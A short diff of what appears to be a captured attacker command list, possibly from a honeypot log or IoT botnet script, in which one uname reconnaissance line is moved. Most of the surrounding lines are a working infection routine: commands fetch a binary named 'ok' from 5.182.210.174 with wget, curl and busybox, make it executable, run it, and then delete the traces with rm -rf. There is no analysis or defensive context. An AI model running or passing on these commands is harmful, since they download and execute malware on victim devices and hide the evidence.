@@ -37,11 +37,11 @@ id
 g & k | zpkfq
 ping; sh
 uname -a
+/bin/./uname -s -v -n -r -m
 /bin/busybox cat /proc/self/exe || cat /proc/self/exe
 exit
 (cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
 ./ok
-/bin/./uname -s -v -n -r -m
 /userfs/bin/wget http://5.182.210.174/ok
 busybox curl -O http://5.182.210.174/ok
 busybox sh ok
